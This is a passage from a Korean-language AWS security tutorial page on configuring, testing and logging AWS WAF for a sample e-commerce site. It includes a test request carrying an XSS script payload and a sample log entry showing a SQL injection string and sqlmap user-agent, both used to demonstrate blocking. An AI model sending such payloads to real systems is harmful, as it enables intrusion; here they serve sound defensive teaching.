curl -w "\nHTTP Code: %{http_code}\n" \
  "https://shop.example.com/api/products?category=electronics"
# 예상: 200 OK

# 테스트 5: XSS 공격 시도
curl -w "\nHTTP Code: %{http_code}\n" \
  "https://shop.example.com/api/search?q=&lt;script&gt;alert('xss')&lt;/script&gt;"
# 예상: 403 Forbidden</code></pre>
            </div>
          </div>

          <div class="step">
            <div class="step-title">Step 2: WAF 샘플 요청 확인</div>
            <p>WAF가 차단한 요청의 샘플을 확인합니다.</p>
            <div class="code-block">
              <div class="code-header">
                <span class="lang">bash</span>
                <button class="copy-btn">복사</button>
              </div>
              <pre><code># 샘플 요청 확인 (최근 차단된 요청)
aws wafv2 get-sampled-requests \
  --web-acl-arn $WEBACL_ARN \
  --rule-metric-name AWSSQLInjection \
  --scope REGIONAL \
  --time-window StartTime=2026-02-19T00:00:00Z,EndTime=2026-02-19T23:59:59Z \
  --max-items 10 \
  --query 'SampledRequests[].{Action:Action,IP:Request.ClientIP,URI:Request.URI,Country:Request.Country}' \
  --output table</code></pre>
            </div>
          </div>

          <div class="step">
            <div class="step-title">Step 3: CloudWatch 메트릭 확인</div>
            <p>WAF 메트릭으로 차단된 요청 수와 패턴을 모니터링합니다.</p>
            <div class="code-block">
              <div class="code-header">
                <span class="lang">bash</span>
                <button class="copy-btn">복사</button>
              </div>
              <pre><code># WAF 차단 요청 수 확인
aws cloudwatch get-metric-statistics \
  --namespace "AWS/WAFV2" \
  --metric-name "BlockedRequests" \
  --dimensions Name=WebACL,Value=ShopEasy-WebACL Name=Region,Value=ap-northeast-2 Name=Rule,Value=ALL \
  --start-time "2026-02-19T00:00:00Z" \
  --end-time "2026-02-19T23:59:59Z" \
  --period 3600 \
  --statistics Sum \
  --output table

# 규칙별 차단 수 확인
for rule in AWSIpReputation AWSCommonRules AWSSQLInjection RateLimit; do
  echo "=== $rule ==="
  aws cloudwatch get-metric-statistics \
    --namespace "AWS/WAFV2" \
    --metric-name "BlockedRequests" \
    --dimensions Name=WebACL,Value=ShopEasy-WebACL Name=Region,Value=ap-northeast-2 Name=Rule,Value=$rule \
    --start-time "2026-02-19T00:00:00Z" \
    --end-time "2026-02-19T23:59:59Z" \
    --period 3600 \
    --statistics Sum
done</code></pre>
            </div>
          </div>
        </div>
      </div>

      <!-- WAF 로깅 -->
      <h3>WAF 로깅 활성화</h3>
      <p>
        WAF 로그를 활성화하면 모든 요청의 상세 정보(매칭된 규칙, 액션, 요청 헤더 등)를 기록할 수 있습니다.
        로그는 S3, CloudWatch Logs, 또는 Kinesis Data Firehose로 전송할 수 있습니다.
      </p>

      <div class="code-block">
        <div class="code-header">
          <span class="lang">bash</span>
          <button class="copy-btn">복사</button>
        </div>
        <pre><code># CloudWatch Logs 로그 그룹 생성 (이름은 반드시 aws-waf-logs- 접두사)
aws logs create-log-group \
  --log-group-name aws-waf-logs-shopeasy \
  --retention-in-days 30

# WAF 로깅 활성화
aws wafv2 put-logging-configuration \
  --logging-configuration '{
    "ResourceArn": "'$WEBACL_ARN'",
    "LogDestinationConfigs": [
      "arn:aws:logs:ap-northeast-2:123456789012:log-group:aws-waf-logs-shopeasy"
    ],
    "RedactedFields": [
      {
        "SingleHeader": {
          "Name": "authorization"
        }
      },
      {
        "SingleHeader": {
          "Name": "cookie"
        }
      }
    ]
  }'</code></pre>
      </div>

      <div class="info-box concept">
        <div class="info-box-title">WAF 로그 주요 필드</div>
        <p>
          WAF 로그의 각 항목에는 다음 정보가 포함됩니다:<br>
          <strong>timestamp:</strong> 요청 시간<br>
          <strong>action:</strong> ALLOW, BLOCK, COUNT<br>
          <strong>terminatingRuleId:</strong> 최종 결정을 내린 규칙<br>
          <strong>httpRequest:</strong> 클라이언트 IP, URI, 헤더 등 요청 상세 정보<br>
          <strong>ruleGroupList:</strong> 평가된 규칙 그룹과 매칭 결과<br>
          <strong>labels:</strong> 규칙에 의해 부여된 라벨
        </p>
      </div>

      <div class="code-block">
        <div class="code-header">
          <span class="lang">json</span>
          <button class="copy-btn">복사</button>
        </div>
        <pre><code>{
  "timestamp": 1708300000000,
  "formatVersion": 1,
  "webaclId": "arn:aws:wafv2:ap-northeast-2:123456789012:regional/webacl/ShopEasy-WebACL/abcd1234",
  "terminatingRuleId": "AWS-SQLInjection",
  "terminatingRuleType": "MANAGED_RULE_GROUP",
  "action": "BLOCK",
  "httpSourceName": "ALB",
  "httpSourceId": "123456789012-app/shopeasy-alb/abcd1234",
  "httpRequest": {
    "clientIp": "203.0.113.50",
    "country": "US",
    "uri": "/api/products?id=1' OR 1=1--",
    "args": "id=1' OR 1=1--",
    "httpVersion": "HTTP/2.0",
    "httpMethod": "GET",
    "requestId": "abc123",
    "headers": [
      { "name": "host", "value": "shop.example.com" },
      { "name": "user-agent", "value": "sqlmap/1.7" }
    ]
  },
  "ruleGroupList": [
    {
      "ruleGroupId": "AWS#AWSManagedRulesSQLiRuleSet",
      "terminatingRule": {
        "ruleId": "SQLi_QUERYARGUMENTS",
        "action": "BLOCK"
      }
    }
  ],
  "labels": [
    { "name": "awswaf:managed:aws:sql-database:SQLi_QueryArguments" }
  ]
}</code></pre>
      </div>

      <div class="info-box warning">
        <div class="info-box-title">WAF 로그 비용 관리</div>
        <p>
          WAF 로그는 모든 요청을 기록하므로 트래픽이 많은 사이트에서는 로그 비용이 상당할 수 있습니다.
          비용을 관리하려면:<br>
          <strong>1. 필터링:</strong> 차단된 요청만 로깅하도록 필터를 설정합니다.<br>
          <strong>2. 보관 기간:</strong> CloudWatch Logs의 보관 기간을 30일로 설정합니다.<br>
          <strong>3. S3 수명 주기:</strong> S3 저장 시 수명 주기 정책으로 30일 후 Glacier로 이전합니다.<br>
          <strong>4. 민감정보 마스킹:</strong> RedactedFields를 사용하여 Authorization, Cookie 등을 마스킹합니다.
        </p>
      </div>

      <h3>WAF 운영 종합 체크리스트</h3>
      <div class="info-box best-practice">
        <div class="info-box-title">ShopEasy WAF 운영 체크리스트</div>
        <p>
          &#x2610; Web ACL이 ALB(또는 CloudFront)에 연결되어 있는가?<br>
          &#x2610; IP Reputation List 규칙이 활성화되어 있는가?<br>
          &#x2610; Core Rule Set(CRS)이 활성화되어 있는가?<br>
          &#x2610; SQL Injection 규칙이 활성화되어 있는가?<br>
          &#x2610; Rate-based 규칙이 설정되어 있는가?<br>
          &#x2610; 로그인 API에 별도의 Rate Limit이 있는가?<br>
          &#x2610; WAF 로깅이 활성화되어 있는가?<br>
          &#x2610; CloudWatch 알람이 설정되어 있는가 (차단 급증 시)?<br>
          &#x2610; 새 규칙 추가 시 Count 모드로 먼저 테스트하는가?<br>
          &#x2610; 정기적으로 샘플 요청과 오탐을 검토하는가?<br>
          &#x2610; 민감 정보(Authorization, Cookie)가 로그에서 마스킹되는가?
        </p>
      </div>

      <div class="info-box tip">
        <div class="info-box-title">WAF + Shield Advanced 조합</div>
        <p>
          대규모 DDoS 공격에 대비하려면 <strong>AWS Shield Advanced</strong>를 함께 사용하는 것을 고려하세요.
          Shield Advanced는 Layer 3/4 DDoS 보호 + WAF 비용 보호(DDoS로 인한 WAF 비용 급증 시 크레딧) +
          24/7 DDoS Response Team 지원을 제공합니다.
          단, 월 $3,000의 기본 요금이 있으므로 비용 대비 효과를 검토해야 합니다.
        </p>
      </div>
    </section>

    <div class="chapter-nav">
      <a href="07-vpc-security.html" class="prev">이전: VPC 보안 심화</a>
      <a href="09-network-security-lab.html" class="next">다음: 이커머스 네트워크 보안 적용</a>
    </div>
  </main>
</div>

<script type="module" src="../assets/js/main.js"></script>
</body>

<!-- Mirrored from rapa-aws-security.vercel.app/chapters/08-waf.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 26 Feb 2026 08:26:36 GMT -->
</html>